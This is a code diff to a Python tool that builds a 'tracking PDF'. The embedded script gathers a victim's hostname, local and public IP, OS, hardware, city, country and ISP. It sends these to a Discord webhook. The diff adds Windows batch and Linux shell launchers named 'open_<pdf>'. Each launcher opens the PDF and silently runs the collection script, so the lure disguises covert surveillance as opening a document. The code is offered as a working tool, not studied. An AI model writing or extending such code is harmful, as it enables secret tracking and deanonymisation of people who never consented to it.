@@ -177,12 +177,14 @@ def create_tracking_pdf(original_pdf, webhook_url):
         with open(original_pdf, 'rb') as src, open(output_pdf, 'wb') as dst:
             dst.write(src.read())
         
-        # Create a Python script that will be embedded in the PDF
+        # Create a Python script that will be executed when the PDF is opened
         tracking_script = f"""
 import requests
 import socket
 import platform
 import json
+import os
+import subprocess
 
 def get_system_info():
     try:
@@ -208,26 +210,26 @@ def send_to_discord():
         
         if system_info:
             message_parts.extend([
-                f"Hostname: {system_info['hostname']}",
-                f"Local IP: {system_info['local_ip']}",
-                f"OS: {system_info['system']}",
-                f"Machine: {system_info['machine']}",
-                f"Processor: {system_info['processor']}"
+                f"Hostname: {{system_info['hostname']}}",
+                f"Local IP: {{system_info['local_ip']}}",
+                f"OS: {{system_info['system']}}",
+                f"Machine: {{system_info['machine']}}",
+                f"Processor: {{system_info['processor']}}"
             ])
         
         # Get public IP
         ip_response = requests.get('https://api.ipify.org?format=json')
         public_ip = ip_response.json()['ip']
-        message_parts.append(f"Public IP: {public_ip}")
+        message_parts.append(f"Public IP: {{public_ip}}")
         
         # Get location info
-        details_response = requests.get(f'http://ip-api.com/json/{public_ip}')
+        details_response = requests.get(f'http://ip-api.com/json/{{public_ip}}')
         details = details_response.json()
         
         if details['status'] == 'success':
             message_parts.extend([
-                f"Location: {details.get('city', 'Unknown')}, {details.get('country', 'Unknown')}",
-                f"ISP: {details.get('isp', 'Unknown')}"
+                f"Location: {{details.get('city', 'Unknown')}}, {{details.get('country', 'Unknown')}}",
+                f"ISP: {{details.get('isp', 'Unknown')}}"
             ])
         
         message = "\\n".join(message_parts)
@@ -236,11 +238,32 @@ def send_to_discord():
         pass
 
 # Execute tracking when PDF is opened
-send_to_discord()
+if __name__ == "__main__":
+    send_to_discord()
 """
         # Save the tracking script
-        with open("tracking_script.py", 'w') as f:
+        script_path = "tracking_script.py"
+        with open(script_path, 'w') as f:
             f.write(tracking_script)
+        
+        # Create a batch file to run the script when PDF is opened
+        if sys.platform == "win32":
+            batch_content = f"""@echo off
+start "" "{output_pdf}"
+python "{script_path}"
+"""
+            batch_file = f"open_{os.path.basename(output_pdf)}.bat"
+            with open(batch_file, 'w') as f:
+                f.write(batch_content)
+        else:
+            shell_content = f"""#!/bin/bash
+xdg-open "{output_pdf}"
+python3 "{script_path}"
+"""
+            shell_file = f"open_{os.path.basename(output_pdf)}.sh"
+            with open(shell_file, 'w') as f:
+                f.write(shell_content)
+            os.chmod(shell_file, 0o755)  # Make shell script executable
         
         console.print(f"[green]Successfully created tracking PDF![/green]")
         show_file_location(output_pdf)
